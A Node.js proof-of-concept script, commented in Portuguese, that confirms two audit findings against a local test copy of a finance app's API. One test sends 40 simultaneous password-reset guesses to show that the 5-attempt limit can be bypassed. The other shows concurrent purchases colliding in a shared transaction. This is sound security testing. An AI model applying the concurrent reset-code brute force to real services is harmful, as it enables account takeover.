/**
 * Provas de conceito (dinâmicas) para confirmar dois achados da inspeção de código.
 * Sobe a API REAL (servidor da bateria 03) num banco temporário — nunca o database.db.
 *
 *  PoC-1  Limite de 5 tentativas do código de recuperação de senha pode ser
 *         ultrapassado com tentativas simultâneas (verificação e incremento separados).
 *  PoC-2  Duas compras parceladas criadas ao mesmo tempo colidem na transação
 *         (BEGIN/COMMIT numa única conexão compartilhada por todas as requisições).
 *
 * Uso: node provas-de-conceito.js <saida.json>
 */
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const SERVIDOR = path.resolve(__dirname, '..', '..', '03-integracao', 'servidor', 'servidor.js');
const BANCO = path.join(os.tmpdir(), 'finup-poc.db');
const PORTA = 3979;
const API = `http://127.0.0.1:${PORTA}`;
const INSP = `http://127.0.0.1:${PORTA + 1}`;
const saida = process.argv[2];

const post = async (rota, body, token) => {
  const r = await fetch(API + rota, { method: 'POST', headers: { 'Content-Type': 'application/json', ...(token ? { Authorization: `Bearer ${token}` } : {}) }, body: JSON.stringify(body) });
  return { status: r.status, body: await r.json().catch(() => null) };
};
const sql = async (q, params = []) => (await fetch(`${INSP}/sql`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sql: q, params }) })).json();

(async () => {
  if (fs.existsSync(BANCO)) fs.unlinkSync(BANCO);
  const api = spawn(process.execPath, [SERVIDOR, BANCO, String(PORTA)]);
  await new Promise((ok) => api.stdout.on('data', (d) => String(d).includes('PRONTO') && ok()));
  const res = {};
  try {
    await post('/users', { name: 'Vítima', email: 'vitima@teste.local', password: 'senha123' });
    const token = (await post('/auth/login', { email: 'vitima@teste.local', password: 'senha123' })).body.token;

    // PoC-1: pede um código e manda 40 palpites errados AO MESMO TEMPO
    await post('/auth/forgot-password', { email: 'vitima@teste.local' });
    const palpites = Array.from({ length: 40 }, (_, i) => String(100000 + i));
    const rs = await Promise.all(palpites.map((code) => post('/auth/reset-password', { email: 'vitima@teste.local', code, new_password: 'qualquer1' })));
    const comparados = rs.filter((r) => /Código incorreto/.test(r.body?.error || '')).length;
    const [pedido] = await sql('SELECT attempts FROM password_resets ORDER BY id DESC LIMIT 1');
    res.poc1 = {
      descricao: '40 palpites simultâneos para um código com limite de 5 tentativas',
      palpites_enviados: 40,
      palpites_conferidos_pelo_servidor: comparados,
      tentativas_registradas_no_banco: pedido.attempts,
      limite_esperado: 5,
      limite_ultrapassado: comparados > 5,
    };

    // PoC-2: 5 compras parceladas (3x) disparadas ao mesmo tempo
    const cat = (await (await fetch(`${API}/categories?type=expense`, { headers: { Authorization: `Bearer ${token}` } })).json())[0].id;
    const compras = await Promise.all(Array.from({ length: 5 }, (_, i) =>
      post('/expenses', { amount: 300 + i, date: '2026-11-10', description: `Parcelada ${i}`, category_id: cat, parcelas: 3 }, token)));
    const linhas = await sql("SELECT description, COUNT(*) AS n FROM expenses WHERE description LIKE 'Parcelada %' GROUP BY description ORDER BY description");
    res.poc2 = {
      descricao: '5 compras em 3x criadas ao mesmo tempo',
      respostas: compras.map((c) => ({ status: c.status, erro: c.body?.error || null })),
      sucesso_201: compras.filter((c) => c.status === 201).length,
      linhas_gravadas_por_compra: linhas,
      esperado: '5 respostas 201 e 3 linhas por compra',
    };
  } finally {
    api.kill();
  }
  fs.writeFileSync(saida, JSON.stringify(res, null, 2));
  console.log(JSON.stringify(res, null, 2));
})();
